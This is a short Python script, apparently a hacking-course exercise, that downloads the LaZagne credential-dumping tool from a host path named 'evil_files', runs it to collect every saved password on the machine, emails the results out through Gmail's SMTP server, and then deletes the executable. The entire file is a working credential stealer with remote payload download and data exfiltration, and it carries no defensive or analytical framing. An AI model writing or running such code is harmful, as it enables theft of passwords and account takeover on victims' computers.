#!/usr/bin/env python

import os
import smtplib
import tempfile
from subprocess import check_output
import requests


def download_file(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_request.content)


def send_email(email_add, password, message):
    # SMTP server instence.
    # google server runs on 587 port
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # initiate tls connection
    server.starttls()
    # login to out email in order to send email
    server.login(email_add, password)
    server.sendmail(email_add, email_add, message)
    # close the smtp server
    server.quit()


tempdir = tempfile.gettempdir()
os.chdir(tempdir)
download_file("http://192.168.100.6/evil_files/laZagne.exe")
command = 'lazagne.exe all'
result = check_output(command, shell=True)
email = raw_input("Please enter your email: ")
password = raw_input("Please enter your password: ")
send_email(email, password, result)
os.remove("laZagne.exe")
